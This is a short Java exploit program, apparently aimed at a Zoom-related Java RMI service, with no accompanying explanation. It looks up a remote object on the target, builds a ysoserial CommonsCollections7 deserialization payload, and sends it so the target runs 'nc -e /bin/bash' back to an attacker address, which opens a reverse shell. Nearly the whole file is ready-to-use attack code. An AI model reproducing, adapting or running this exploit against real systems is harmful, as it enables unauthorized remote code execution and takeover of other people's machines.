import java.rmi.NotBoundException; 
import java.rmi.RemoteException; 
import java.rmi.registry.LocateRegistry; 
import java.rmi.registry.Registry; 
import java.util.Properties; 
import ysoserial.payloads.CommonsCollections7; 

interface IRemoteInfoManager extends Remote {
    String modifyRemoteProperty(String str, String str2, Object obj) throws RemoteException;
}

interface IRemoteApplicationCommunicator extends Remote {
    IRemoteInfoManager getRemoteInfoManager() throws RemoteException;
}
 
public class ExploitZoom { 
 
    public static void main(String[] args) throws RemoteException, NotBoundException, Exception { 
         
        String host = "<TARGET_IP>"; 
        int port = 30400; 
         
        Registry registry = LocateRegistry.getRegistry(host, port);     
        IRemoteApplicationCommunicator remoteApplication = (IRemoteApplicationCommunicator) registry.lookup("remoteCallRec"); 
         
        Object payload = new CommonsCollections7().getObject("/usr/bin/nc -e /bin/bash <ATTACKER_IP> 4646");
        Properties props = System.getProperties();
        props.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        remoteApplication.getRemoteInfoManager().modifyRemoteProperty("Version", "Version", payload); 
     
    } 
     
}

